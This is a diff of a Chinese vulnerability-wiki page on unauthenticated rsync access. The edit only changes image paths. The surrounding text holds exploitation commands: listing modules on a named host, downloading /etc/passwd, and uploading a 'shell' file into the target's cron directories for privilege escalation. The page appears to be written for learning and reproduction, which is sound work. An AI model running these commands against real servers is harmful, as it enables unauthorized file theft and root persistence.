@@ -23,19 +23,19 @@ rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议�
 三、复现过程
 ------------
 
-`nmap`先扫一波：![1.png](/Users/aresx/Documents/VulWiki/.resource/Rsync未授权访问漏洞/media/rId24.png)
+`nmap`先扫一波：![1.png](./.resource/Rsync未授权访问漏洞/media/rId24.png)
 
     rsync rsync://www.0-sec.org:873/
     rsync rsync://www.0-sec.org:873/src 来查看模块名列表
     我们再列出src模块下的文件
     rsync rsync://www.0-sec.org:873/src/
 
-![2.png](/Users/aresx/Documents/VulWiki/.resource/Rsync未授权访问漏洞/media/rId25.png)
+![2.png](./.resource/Rsync未授权访问漏洞/media/rId25.png)
 
     我们可以下载任意文件：
     rsync -av rsync://www.0-sec.org:873/src/etc/passwd ./
 
-![3.png](/Users/aresx/Documents/VulWiki/.resource/Rsync未授权访问漏洞/media/rId26.png)
+![3.png](./.resource/Rsync未授权访问漏洞/media/rId26.png)
 
 **提权：**
 
@@ -51,7 +51,7 @@ rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议�
     rsync -av shell rsync://192.168.91.130/src/etc/cron.hourly
     rsync -av shell rsync://www.0-sec.org:873/src/etc/cron.d/shell
 
-![4.png](/Users/aresx/Documents/VulWiki/.resource/Rsync未授权访问漏洞/media/rId27.png)
+![4.png](./.resource/Rsync未授权访问漏洞/media/rId27.png)
 
 本地监听：
 
